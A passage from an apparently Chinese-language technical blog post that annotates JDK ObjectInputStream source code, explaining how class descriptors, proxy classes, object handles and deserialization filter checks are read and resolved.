class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并处理“空引用”标记，设置 passHandle 为 NULL_HANDLE 并返回 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readNull</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望并消费结构化标记 TC_NULL（0x70）</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_NULL) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对应“无对象”——设置当前句柄为特殊的 NULL_HANDLE</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并处理“对象句柄引用”（TC_REFERENCE），把 passHandle 设为读到的句柄，</span></span><br><span class="line"><span class="comment"> * 并返回该句柄对应的对象实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义说明：</span></span><br><span class="line"><span class="comment"> * - 写端若多次写出同一对象，首次写“本体”，随后写“引用”：TC_REFERENCE + wireHandle。</span></span><br><span class="line"><span class="comment"> * - wireHandle = baseWireHandle(0x7E0000) + localIndex（本地句柄表下标）。</span></span><br><span class="line"><span class="comment"> * - 读端读到 TC_REFERENCE 后减去 base 得到本地句柄下标，到 handles 表中取对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 与 unshared 的关系：</span></span><br><span class="line"><span class="comment"> * - 当上层使用 readUnshared(...) 时，引用语义被禁止：</span></span><br><span class="line"><span class="comment"> *   * 若此处遇到 TC_REFERENCE，则直接抛 InvalidObjectException；</span></span><br><span class="line"><span class="comment"> *   * 若句柄指向的是“以非共享方式登记”的对象（unsharedMarker），也抛异常。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">readHandle</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 期望并消费结构化标记 TC_REFERENCE（0x71）</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_REFERENCE) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 4 字节 wire handle，并还原为本地句柄表下标：passHandle</span></span><br><span class="line">    passHandle = bin.readInt() - baseWireHandle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基本健全性检查：下标必须落在已分配范围内</span></span><br><span class="line">    <span class="keyword">if</span> (passHandle &lt; <span class="number">0</span> || passHandle &gt;= handles.size()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">            String.format(<span class="string">&quot;invalid handle value: %08X&quot;</span>, passHandle + baseWireHandle));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非共享语义下不允许“读回引用”（别名共享被禁止）</span></span><br><span class="line">    <span class="keyword">if</span> (unshared) &#123;</span><br><span class="line">        <span class="comment">// 注：原实现里 REMIND 注释讨论异常类型，这里按 JDK 用法抛 InvalidObjectException</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;cannot read back reference as unshared&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查出该句柄所对应的对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> handles.lookupObject(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若该句柄对应的是“非共享标记”（说明写端以 unshared 方式登记过该对象），</span></span><br><span class="line">    <span class="comment">// 则同样不允许通过引用读回（违背非共享语义）</span></span><br><span class="line">    <span class="keyword">if</span> (obj == unsharedMarker) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;cannot read back reference to unshared object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化过滤器计数检查（不带具体类，仅校验引用计数/深度等配额）</span></span><br><span class="line">    filterCheck(<span class="literal">null</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回“动态代理类（Proxy）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - 流格式（与写端 writeProxyDesc 对称）：</span></span><br><span class="line"><span class="comment"> *   TC_PROXYCLASSDESC</span></span><br><span class="line"><span class="comment"> *   int interfaceCount</span></span><br><span class="line"><span class="comment"> *   UTF interfaceName[interfaceCount]</span></span><br><span class="line"><span class="comment"> *   classAnnotations (以 Block-Data 多段写入，随后 TC_ENDBLOCKDATA)</span></span><br><span class="line"><span class="comment"> *   superClassDesc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - 读取完成后：</span></span><br><span class="line"><span class="comment"> *   * 为该描述符分配的句柄会写入 handles，并把 passHandle 设为该句柄；</span></span><br><span class="line"><span class="comment"> *   * 若无法把接口列表解析成本地 VM 中的 Class（类/接口缺失），会把</span></span><br><span class="line"><span class="comment"> *     ClassNotFoundException 记录到该描述符句柄上（上层稍后会感知并抛出）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - 反序列化过滤（JDK 9+）：对解析到的接口与代理类本身都会做 filterCheck，</span></span><br><span class="line"><span class="comment"> *   可用于阻断危险类型/过大结构。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared  是否采用“非共享”语义（readUnshared 调用场景）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>          读取到的代理类描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException 类型码不符合预期</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidObjectException   接口数量异常等结构问题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException    解析得到的 Class 不是代理类等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 期望并消费“代理类描述符”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_PROXYCLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 构建一个空的 OSC，并为其分配句柄（根据 unshared 决定是否可被回引）</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在真正完成前，先把 passHandle 置为 NULL_HANDLE，避免“半成品”被外部误用</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读取“接口列表”</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numIfaces</span> <span class="operator">=</span> bin.readInt();</span><br><span class="line">    <span class="keyword">if</span> (numIfaces &gt; <span class="number">65535</span>) &#123; <span class="comment">// 保护性限制（协议/实现内的安全上限）</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;interface limit exceeded: &quot;</span> + numIfaces);</span><br><span class="line">    &#125;</span><br><span class="line">    String[] ifaces = <span class="keyword">new</span> <span class="title class_">String</span>[numIfaces];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numIfaces; i++) &#123;</span><br><span class="line">        ifaces[i] = bin.readUTF(); <span class="comment">// 每个接口的全限定名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 解析为本地 Class（可能失败）</span></span><br><span class="line">    Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切到“块数据模式”，为稍后读取/跳过注解块（classAnnotations）做准备</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试把接口名数组解析成一个代理类（由 resolveProxyClass 钩子决定如何加载）</span></span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveProxyClass(ifaces)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Proxy.isProxyClass(cl)) &#123;</span><br><span class="line">            <span class="comment">// 解析回来的并非真正的代理类</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Not a proxy&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 包访问检查：防止自定义子类借此越权访问受限包下的类型</span></span><br><span class="line">            ReflectUtil.checkProxyPackageAccess(getClass().getClassLoader(), cl.getInterfaces());</span><br><span class="line">            <span class="comment">// 对每个接口做反序列化过滤器检查（可按策略拒绝）</span></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; itf : cl.getInterfaces()) &#123;</span><br><span class="line">                filterCheck(itf, -<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 记录“无法解析类”的异常，稍后绑定到描述符句柄</span></span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在读取更多内容前，先对“解析到的代理类本身”做一次过滤检查（早失败）</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 跳过“类注解块”（classAnnotations）：</span></span><br><span class="line">    <span class="comment">//    - 写端可能写了若干 TC_BLOCKDATA / TC_BLOCKDATALONG；必须读到 TC_ENDBLOCKDATA</span></span><br><span class="line">    <span class="comment">//    - skipCustomData() 内部会消费这些块，并在结尾切回“非块模式”</span></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 读取“父类描述符”（superClassDesc），并初始化 OSC</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++;   <span class="comment">// 统计（可被过滤器用于限额判断）</span></span><br><span class="line">        depth++;             <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">        <span class="comment">// initProxy：把“解析到的 Class（或异常）”与“父类描述符”写入本 OSC</span></span><br><span class="line">        desc.initProxy(cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 完成该描述符的构建，允许后续通过句柄回引</span></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取并返回“普通类（非动态代理）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 流格式（与写端 writeNonProxyDesc 对称）：</span></span><br><span class="line"><span class="comment"> *   TC_CLASSDESC</span></span><br><span class="line"><span class="comment"> *   classDescBody                  // 类名、SUID、flags、字段表（由 readClassDescriptor 读取）</span></span><br><span class="line"><span class="comment"> *   classAnnotations (Block-Data)  // 可选注解块，随后 TC_ENDBLOCKDATA</span></span><br><span class="line"><span class="comment"> *   superClassDesc                 // 父类的类描述符（递归；到 Object 为 TC_NULL）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 读取完成后：</span></span><br><span class="line"><span class="comment"> * - 为该描述符分配的句柄记录在 handles，并将 passHandle 设为该句柄；</span></span><br><span class="line"><span class="comment"> * - 若不能将该描述符解析为本地 JVM 中的 Class，则把 ClassNotFoundException</span></span><br><span class="line"><span class="comment"> *   绑定到该描述符句柄（上层稍后会感知并抛出）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> unshared 是否采用“非共享”语义（readUnshared 场景）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 读取到的 ObjectStreamClass</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException               I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StreamCorruptedException  类型码非法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException     读取类描述符体失败等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readNonProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 期望并消费“普通类描述符”标记</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 创建空的 OSC，并分配句柄（unshared 时登记特殊标记以禁止后续回引）</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">    <span class="comment">// 在真正完成前，passHandle 暂置为空，避免“半成品”被使用</span></span><br><span class="line">    passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 读取“类描述符主体”（classDescBody）</span></span><br><span class="line">    <span class="comment">//    - 等价于写端的 writeClassDescriptor(desc)</span></span><br><span class="line">    <span class="comment">//    - 包括：类名、serialVersionUID、flags、字段表等</span></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        readDesc = readClassDescriptor();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 读取“主体”阶段就需要加载某些类型签名，失败则包装为 InvalidClassException</span></span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">            <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 尝试把描述符解析为本地 Class，并做包访问校验</span></span><br><span class="line">    Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 切到块数据模式，准备读取/跳过“类注解块”（classAnnotations）</span></span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass(); <span class="comment">// 自定义子类需做额外的包访问检查</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// resolveClass：把 readDesc 指向的类名解析为本地 Class（可被子类覆盖）</span></span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">            <span class="comment">// 安全：自定义子类时校验包访问权限，避免越权加载敏感包</span></span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        resolveEx = ex; <span class="comment">// 暂存，稍后绑定到描述符句柄</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在读取更多内容之前，先对解析到的类本身做一次过滤器检查（JDK9+）</span></span><br><span class="line">    <span class="comment">// 可按策略拒绝危险类型/过大结构（数组长度等此处无，传 -1）</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 跳过“类注解块”（classAnnotations）直到 TC_ENDBLOCKDATA：</span></span><br><span class="line">    <span class="comment">//    - 写端可能写了若干 TC_BLOCKDATA/TC_BLOCKDATALONG；</span></span><br><span class="line">    <span class="comment">//    - 这里负责全部吞掉，并在结束后切回非块模式</span></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 读取“父类描述符”，并初始化 OSC</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        totalObjectRefs++; <span class="comment">// 统计（供过滤器限额评估）</span></span><br><span class="line">        depth++;           <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">        <span class="comment">// initNonProxy：将“读取到的主体信息 + 解析到的 Class（或异常） +</span></span><br><span class="line">        <span class="comment">//               父类描述符”组合进当前描述符</span></span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 标记该描述符构建完成，允许后续通过句柄回引；设置 passHandle 并返回</span></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在读取类信息的时候顺带还会尝试从本地加载对应的类。</p>
<p>对于代理类，会根据该代理类实现所有的接口调用 <code>java.lang.reflect.Proxy#getProxyClass</code> 创建对应的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将代理类描述符里给出的接口名数组解析为“本地 JVM 的代理类 Class”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;可被子类覆盖：子类既可以在读取代理类描述符（接口名列表、注解块等）时</span></span><br><span class="line"><span class="comment"> * 额外读取自定义数据，也可以在这里通过自定义的类加载机制加载接口和生成代理类。</span></span><br><span class="line"><span class="comment"> * 与输出端的 &#123;<span class="doctag">@link</span> ObjectOutputStream#annotateProxyClass(Class)&#125; 相对应。</span></span><br><span class="line"><span class="comment"> * &lt;b&gt;同一个代理类描述符在一次反序列化过程中只会调用一次本方法。&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认实现逻辑（与 &#123;<span class="doctag">@link</span> #resolveClass(ObjectStreamClass)&#125; 类似）：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;选择类加载器：取调用栈上“最近的一个由用户自定义类加载器定义的类”的那个</span></span><br><span class="line"><span class="comment"> *       ClassLoader 作为 &lt;code&gt;latestLoader&lt;/code&gt;；若没有，使用 &lt;code&gt;null&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> *      （表示引导/系统默认加载路径）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;对每个接口名 &lt;code&gt;i&lt;/code&gt; 执行</span></span><br><span class="line"><span class="comment"> *       &lt;pre&gt;Class.forName(i, false, latestLoader)&lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *       得到接口的 Class 对象；若某接口是&lt;b&gt;非 public&lt;/b&gt;，记录其类加载器为</span></span><br><span class="line"><span class="comment"> *       &lt;code&gt;nonPublicLoader&lt;/code&gt;，并要求所有非 public 接口的类加载器必须一致，</span></span><br><span class="line"><span class="comment"> *       否则抛出 &#123;<span class="doctag">@link</span> IllegalAccessError&#125;（JDK 对代理类的封装性约束）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;调用</span></span><br><span class="line"><span class="comment"> *       &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *       Proxy.getProxyClass(</span></span><br><span class="line"><span class="comment"> *           hasNonPublicInterface ? nonPublicLoader : latestLoader,</span></span><br><span class="line"><span class="comment"> *           classObjs)</span></span><br><span class="line"><span class="comment"> *       &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *       生成代理类；若参数非法导致其抛出 &#123;<span class="doctag">@link</span> IllegalArgumentException&#125;，</span></span><br><span class="line"><span class="comment"> *       此处包装为 &#123;<span class="doctag">@link</span> ClassNotFoundException&#125; 抛出（与反序列化解析失败语义统一）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> interfaces 代理类描述符中反序列化得到的“接口全限定名”列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 由这些接口组成的代理类 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException  底层 I/O 异常（默认实现通常不会抛）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 